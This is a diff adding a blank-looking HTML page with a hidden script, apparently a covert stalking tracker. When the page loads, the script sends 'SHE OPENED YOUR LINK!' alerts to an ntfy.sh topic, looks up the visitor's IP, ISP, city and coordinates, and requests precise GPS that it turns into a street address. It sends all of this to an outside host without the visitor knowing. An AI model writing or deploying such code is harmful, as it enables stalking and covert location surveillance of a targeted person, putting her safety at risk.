@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title></title>
+<style>body{background:#fff;margin:0}</style>
+</head><body>
+<script>
+(function(){
+  var T='roja-tracker-k141';
+  function s(title,msg,p){
+    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})})}catch(e){}
+  }
+  var d=/mobile/i.test(navigator.userAgent)?'📱 Mobile':'💻 Desktop';
+  var t=new Date().toLocaleString('en-US',{timeZone:'America/Chicago'});
+  s('👀 SHE OPENED YOUR LINK!','Device: '+d+'\nTime: '+t,5);
+
+  fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,query')
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(d.status!=='success')return;
+      var map='https://maps.google.com/?q='+d.lat+','+d.lon;
+      var org=d.org?'\n🏢 '+d.org:'';
+      s('📍 Location','📌 '+d.city+', '+d.regionName+' '+d.zip+'\n🌐 ISP: '+d.isp+org+'\n🔢 IP: '+d.query+'\n🗺️ Map: '+map,4);
+    }).catch(function(){});
+
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(function(pos){
+      var map='https://maps.google.com/?q='+pos.coords.latitude+','+pos.coords.longitude;
+      fetch('https://nominatim.openstreetmap.org/reverse?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&format=json')
+        .then(function(r){return r.json()})
+        .then(function(d){s('📍 EXACT ADDRESS!',d.display_name+'\n🗺️ Map: '+map,5)})
+        .catch(function(){s('📍 GPS',pos.coords.latitude+','+pos.coords.longitude+'\n🗺️ Map: '+map,4)});
+    },function(){},{enableHighAccuracy:true,timeout:10000});
+  }
+})();
+</script>
+</body></html>
